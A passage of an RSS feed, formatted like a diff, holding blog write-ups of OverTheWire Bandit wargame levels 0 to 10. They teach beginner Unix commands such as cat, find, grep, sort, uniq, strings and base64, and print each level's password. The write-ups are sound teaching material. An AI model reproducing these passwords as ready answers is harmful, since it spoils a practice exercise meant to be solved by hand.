+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@melinda:~$ ls -lh
+total 4.0M
+-rw-r----- 1 bandit8 bandit7 4.0M Nov 14  2014 data.txt
+
+bandit7@melinda:~$ file data.txt 
+data.txt: UTF-8 Unicode text
+
+bandit7@melinda:~$ wc -c data.txt 
+4184396 data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have a 4MB text file, meaning there are 4184396 characters in it! Too big to just go sneaking around.&lt;/p&gt;
+
+&lt;p&gt;One of the multiple available solutions is to cat the file and pipe it to the &lt;em&gt;grep&lt;/em&gt; tool. This way we might extract just the line in which the word “millionth” appears.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@melinda:~$ cat data.txt | grep millionth
+millionth   cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bandit-8&quot;&gt;Bandit 8&lt;/h2&gt;
+&lt;p&gt;Our data.txt is still a big text file, so we will need to process it instead of searching like fools. Our friendly tools this time are &lt;em&gt;uniq&lt;/em&gt; and &lt;em&gt;sort&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Since the passoword is the only non-repeating line in the file, &lt;em&gt;uniq&lt;/em&gt; is the obvious choice. According to man:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uniq - report or omit repeated lines
+...
+DESCRIPTION
+Filter  adjacent  matching lines from INPUT (or standard input), writing to OUTPUT (or standard output).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nevertheless, when we run it we still get a lot of text, even when using option -u for printing unique lines only.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened-1&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;uniq&lt;/em&gt; will compare &lt;strong&gt;adjacent&lt;/strong&gt; lines, according to the man page. This means if the repeated line is not immediately before or after its twin, uniq will not filter them.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;This is where &lt;em&gt;sort&lt;/em&gt; comes in. We first sort the lines of the file alphabetically and then apply the &lt;em&gt;uniq&lt;/em&gt; filter over the result (we &lt;em&gt;pipe&lt;/em&gt; the commands):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit8@melinda:~$ sort data.txt | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The good thing here is we do not even need &lt;em&gt;cat&lt;/em&gt;, since &lt;em&gt;sort&lt;/em&gt; writes its output to stdout :)&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-9&quot;&gt;Bandit 9&lt;/h2&gt;
+&lt;p&gt;This time our &lt;em&gt;data.txt&lt;/em&gt; has some binary data and a password somewhere in the middle of the junk, prepended by “several ‘=’ characters”.&lt;/p&gt;
+
+&lt;p&gt;The most immediate way I could think was to grep ‘==’. As expected it does not work and we receive:&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened-2&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;Why can’t a simple &lt;em&gt;grep&lt;/em&gt; solve it? Let’s check:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@melinda:~$ grep '==' data.txt
+Binary file data.txt matches
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hm, it seems it thinks the file contains binary data. Let’s check a little deeper:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@melinda:~$ od -c data.txt
+...
+0045520 300 334   b   * 347 360 350   1   K 355 335 026   k 004 220 214
+0045540   4   -   = 002 307   % 216   h 376   ] 350 201 243   i  \n   H
+0045560 210 237   { 235   ^ 367 255   \   P 376   _   7 246 213   S 244
+0045600 267   w 233 347  \b 031   C   _ 304   p 377 260   ^ 242 354 325
+0045620 356   .   4   J 232  \b 214   v   z 310 214   p   J 036 307   D
+0045640 372 246 235 216 226 225   y 003 236 320  **\0**  \f 350   ?   5 223
+0045660 266 204 245
+0045663
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So you see, there is at least one &lt;strong&gt;\0&lt;/strong&gt; character, which is enough for grep to consider the whole file as a binary. Because of this it will deliver that annoying message.&lt;/p&gt;
+
+&lt;h3 id=&quot;solutions&quot;&gt;Solution(s)&lt;/h3&gt;
+&lt;p&gt;There are too many ways to solve it. Basically we want the tool we are going to use to interpret whatever it reads as text, not binary.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@melinda:~$ grep -a '==' data.txt
+�f�����^B �ﺱ&amp;gt;O^FD�_^P^Q��]�dL�Q�5bʵ���N��]��^F��^]W��^Z���94��%{�%�����h��n    oX:��|^U.�U��ކ�k��f&quot;�,�W�ſ^D�^Ax��ˋ!W^[�^X�l;l�rv��/�����P/��VX�o�*�����D�d6��.���#�v[u{m��S�[��r�Ⱦ�? 5�Nv���&amp;gt;h�.^\u^_�p^R��#��r@h^&amp;gt;U�n�#���M�`�a&amp;amp;bhR�^Z�k�^T�I�*���j߂
+                                                                    ^T���:ih��yk�T;����v&amp;lt;��:E|���}�����^T����wp�s�O&quot;��)���p$�^^�L�y L�K�    �1��+���v͋&quot;Y�N�^[^By&amp;gt;P^XK�Z�-�^_ȍ�t�����@^��^]c�
+                          ��ڿ��{�m��^[����g��:q���T-!u�{^R�
+z哞��1cF�========== **truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk**
+
+bandit9@melinda:~$ cat -v data.txt | grep ==
+zM-eM-^SM-^^M-@M-E1cFM-u========== **truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk**
+M-'{M-pM-3M-ixM-mM-^CLM-^[M-RV9p&amp;gt;^^^RazM-\M-g^T^V!7M-^_M-^BR#^UM-}M-^TtM-x7M-&quot;^GM-^[M-^P^G2^TM-njM-^OM-vM-C^ATM-&amp;amp;M-9uI^GM- M-t_M-^On^KM-hM-^I}`M-^AM-^@y&quot;X^B^CM-3ppM-^UM-.M-^LM-^P^PM-zmM-?n^GM-?^FYx^_^]aM-^PM-^XM-\M-^@M-oM-^E)+M-h*tM-^`M-O3-M-^]kM-qM-1y{hM-p^H#&quot;M-_)#&quot;M-rM-^DM-^EI^BY22fM-^EM-OM-{M-gUM-`M-b^^M-&quot;^G^Ky$M-^RM-,M-]  M-/M-i^NM-w&amp;lt;^TNM-)M-K5XdM-snM-^FM-WM-7M-^GM-QM-.M-kM-eM-^@Fk8M-^HM-^Z^OM-IM-R^FM-H^PM-G M-~!lM-GM-i[M-.eM-^HzM-^F^^^S:@M-^Vx^NM-7LM-^YM-D`65M-/%M-rQM-N^QM-(M-e^M&amp;amp;]M-Rd^OM-_^LM-,M-^ZM-CDM-%M-JM-^PM-2X^\M-gM-W^D1M-bM-4M-DM-OM-^RM-7&amp;amp;MM-^D6eM-^Dw=^HM-tAM-6^HM-&amp;lt;^EM-*^QM-^Wf\%^@M-6M-R^YZFM-qkwlM-^TNK.M-^^^O^VzM-:M-WCS\^CM-^EHM-=-M-^T^]AM-&amp;gt;)M-BM-sM-&quot;M-OM-n{M-{M-uM-^RM-oM-R]M-/M-=M-^_M-3M-ZM-G&amp;lt;M-^V'WT$M-3M-EM-!M-xJ\M-)M-^LJM-VM-P&quot;M-eM-sM-mM-^[M-]nM-nM-^MM-@   PM-,M-^T^R^_TyM-^W.M-^LDM-^[M-/M-q}ZM-^DM-L^Nm~M-9M-^[M-VM-^J8M-dM-vM-pM-3M-^YM-^ETM-HQ&quot;^EkM-EM-VhM-^JM-1JM-2M-tbM-!v?4sM-^V0M-^I$jM-^Q87M-^WhM-d^NM-&amp;gt;M-^MM-$/]^]1M-^Nl#M-jM-^AM-^?M-#b^ZM-y^DM-=M-eM-!M-^VM-^IM-^YM-lqM-\M-?M-^0M-==^D^@xp,b^ExM-wM-^_M-,M-y3M-WM-^EM-l^[M-^Yv^Y^_M-5&amp;gt;M-^GM-g^P+0)M-n^R    M-j:LM-?yM-hvM-dM-^\M-pwb;M-^N  M-{M-yM-i^ZM-1
+
+
+*bandit9@melinda:~$ strings data.txt | grep ==
+I========== the6
+========== password
+========== ism
+========== **truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk**
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yep, I also agree the solution using strings is the simplest/most elegant :)&lt;/p&gt;
+
+&lt;h1 id=&quot;bandit-10&quot;&gt;Bandit 10&lt;/h1&gt;
+&lt;p&gt;Base64 is one of the most important encodings in computer science. It is mostly used due to historical reasons related to compatibility. Basically it takes 3 bytes (3 * 8 = 24 bits)and represents it as 4 chars in [a-zA-Z0-9], each spanning 6 bits (4*6 = 24 bits). Please google it in case this seems way too odd to you.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;There are really no gotchas here. All the chall wants to show you is you can decode base64 from terminal.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@melinda:~$ cat data.txt 
+VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==
+bandit10@melinda:~$ cat data.txt | base64 --decode
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+				<pubDate>Thu, 13 Oct 2016 00:00:00 -0300</pubDate>
+				<link>/ctf/2016/10/13/bandit-wargame-6-to-10.html</link>
+				<guid isPermaLink="true">/ctf/2016/10/13/bandit-wargame-6-to-10.html</guid>
+			</item>
+		
+			<item>
+				<title>Bandit CTF writeup [0-5]</title>
+				<description>&lt;h2 id=&quot;bandit-0&quot;&gt;Bandit 0&lt;/h2&gt;
+&lt;p&gt;Too obvious for a writeup… Ok, just a simple SSH&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh bandit0@bandit.labs.overthewire.org
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When prompted to insert the password, go for &lt;em&gt;bandit0&lt;/em&gt;. Once logged in, let’s se what is in there:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit0@melinda:~$ ls
+readme
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Checking the content of the only file:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit0@melinda:~$ cat readme 
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result is an ugly password. Don’t waste your time trying to figure out if it is a hash, base64, permutation or any stuff like that. Just use it as the password for level 1. Plain simple.&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-1&quot;&gt;Bandit 1&lt;/h2&gt;
+&lt;p&gt;After logging into level 1 using the password we found in the last level:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit1@melinda:~$ ls
+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hm, a file named -. Well, that is odd. If we try to check the contents of the file the way we did in level0 it is not going to work. In fact, it will halt and wait for our input.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened&quot;&gt;What happened?&lt;/h3&gt;
+
+&lt;p&gt;Using - as a reference to stdin is a popular convention in the *nix world. Nothing actually related to the kernel, it is just a common kind of abreviation to stdin programmers use (and must implement in case they want to use it). In the case of &lt;em&gt;cat&lt;/em&gt; program, it does is implemented.&lt;/p&gt;
+
+&lt;p&gt;But what exactly does stdin mean? Let us see what the official documentation has to say about it (READ THE DOCS!):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ man stdin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So every program running in an unix envirnment should normally have 3 standard I/O streams:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;stdin - the input to it&lt;/li&gt;
+  &lt;li&gt;stdout - its output&lt;/li&gt;
+  &lt;li&gt;stderr - diagnostic/error messages&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;By default, all of these streams are attached to tty4, aka your beautiful black terminal. In this case your terminal receives the input to the program and also prints its output and error messages.&lt;/p&gt;
+
+&lt;p&gt;According to &lt;em&gt;cat&lt;/em&gt; manual (again, READ THE DOCS):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;With no FILE, or when FILE is -, read standard input.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What happened when we tried to cat our weird named file is that we are actually telling the program to read the stdin stream. This means we are asking the &lt;em&gt;cat&lt;/em&gt; program to receive our command and so it halts.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;In order to solve this tricky situation we must explicitly tell &lt;em&gt;cat&lt;/em&gt; we do not want it to read stdin, but our beloved file. The solution is to pass a more complete path to the file. Some solutions:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit1@melinda:~$ cat ./-  
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+bandit1@melinda:~$ cat ~/-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+bandit1@melinda:~$ pwd
+/home/bandit1
+bandit1@melinda:~$ cat /home/bandit1/-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bandit-2&quot;&gt;Bandit 2&lt;/h2&gt;
+&lt;p&gt;Checking the files in the current directory:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit2@melinda:~$ ls
+spaces in this filename
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When we try to print the file’s content the way it is written above we will find some ugly errors:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit2@melinda:~$ cat spaces in this filename
+cat: spaces: No such file or directory
+cat: in: No such file or directory
+cat: this: No such file or directory
+cat: filename: No such file or directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;what-happened-1&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;The trick here is that spaces are somewhat special charachters (along with others like *, $ or “) that must be &lt;em&gt;escaped&lt;/em&gt; in order to work the way we intend in this case, i.e., a normal character belonging to the filename.&lt;/p&gt;
+
+&lt;p&gt;Let me explain. Some chars represent important symbols to the terminal. Indeed, the bash linux terminal is very closely related to the bash script language. This means whenever you type a symbol belonging to the bash scripting language the shell will try to interpret it as if it was part of a &lt;em&gt;code&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Spaces are intepreted as commands separators in bash. This is why we got 4 lines of errors in our previous attempt to cat the file. What the shell reads is “cat the file named ‘spaces’, then cat the other file named ‘in’…” and so on so forth.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;Whenever we do not want a bash symbol to be interpreted, i.e. read as code instead of an innocent character, we must &lt;em&gt;escape&lt;/em&gt; it. The way we do it is by prepending a backslash to our char.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit2@melinda:~$ cat spaces\ in\ this\ filename 
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note: if you type “cat spaces” and press tab 2 times it will autocomplete the name of the file and automatically escape its patological characters.&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-3&quot;&gt;Bandit 3&lt;/h2&gt;
+&lt;p&gt;This time when we list the contents of the current directory we will find another directory instead of a simple file. Well, actually directories &lt;em&gt;are&lt;/em&gt; files in &lt;em&gt;nix&lt;/em&gt;, just like everything else. My point here is we must move into this other directory and check what is there inside of it:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@melinda:~$ ls -l 
+total 4
+drwxr-xr-x 2 root root 4096 Nov 14  2014 inhere
+bandit3@melinda:~$ cd inhere/
+bandit3@melinda:~/inhere$ ls
+bandit3@melinda:~/inhere$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Oh no, it seems to be empty!&lt;/p&gt;
+
+&lt;h3 id=&quot;what-happened-2&quot;&gt;What happened?&lt;/h3&gt;
+&lt;p&gt;Some files in &lt;em&gt;nix&lt;/em&gt; are said to be &lt;em&gt;hidden&lt;/em&gt;, or the so called &lt;em&gt;dot-files&lt;/em&gt;. Whenever a file is prepended with a dot the bash interpreter knows it must not be displayed unless by explicit command.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;ls&lt;/em&gt; command does one thing or another besides simply blindly listing obvious files. It has many options that go from formating the detailed output in order to make it human readable to listing hidden files (for the last time, READ THE DOCS).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@melinda:~/inhere$ ls -a
+.  ..  .hidden
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can see there is a &lt;em&gt;.hidden&lt;/em&gt; file inside of this directory!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@melinda:~/inhere$ cat .hidden 
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bandit-4&quot;&gt;Bandit 4&lt;/h2&gt;
+&lt;p&gt;This time we do not have a problem in the sense of the previous levels. Instead we are now presented with a directory containing some files. The stupid way to solve it is to manually cat one by one until something like the previous passwords shows up. A better approach is to write a one-liner script that automatically does this dirty job for us (remeber I said the shell is actually an interpreter?).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@melinda:~$ cd inhere/
+bandit4@melinda:~/inhere$ for f in ./\*; do cat $f; echo; done
+ 
+;�-i�(��z��У��ޘ��8鑾
+?�@c
+    O8�L��c�Ч7�zb~��ף���U�
+�g�f�4�6+&amp;gt;&quot;��B�Vx��d��;de�O
+�:n����8S��Ѕ[�/q�(��@��M�.�t
+����+��5�`�¶R
+�1*6C�u#Nr�
+��hZ����P�邚���{#��TP��6�]��X:
+����!��&amp;gt;P�
+d{����ҏH���xX|�
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+cat: ./-file07~: Permission denied
+
+��M�����#8B0wPg�����C���@��FM�
+\#[:*���?��j���U�
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we can easily see the noble password in the middle of the junk :)&lt;/p&gt;
+
+&lt;h2 id=&quot;bandit-5&quot;&gt;Bandit 5&lt;/h2&gt;
+&lt;p&gt;According to the instructions in the site:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: - human-readable - 1033 bytes in size - not executable
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are many ways to accomplish this level. In fact, there is an overhead of information in the challenge description. If we search only for the files with 1033 bytes we will find only one.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@melinda:~/inhere$ find . -size 1033c
+./maybehere07/.file2
+bandit5@melinda:~/inhere$ cat maybehere07/.file2 
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A somewhat more complete solution would be:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@melinda:~/inhere$ find . -size 1033c ! -perm +x -exec ls -lh {} +
+-rw-r----- 1 root bandit5 1.1K Nov 14  2014 ./maybehere07/.file2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+				<pubDate>Thu, 13 Oct 2016 00:00:00 -0300</pubDate>
+				<link>/ctf/2016/10/13/bandit-wargame-0-to-5.html</link>
+				<guid isPermaLink="true">/ctf/2016/10/13/bandit-wargame-0-to-5.html</guid>
+			</item>
+		
+	</channel>
+</rss>
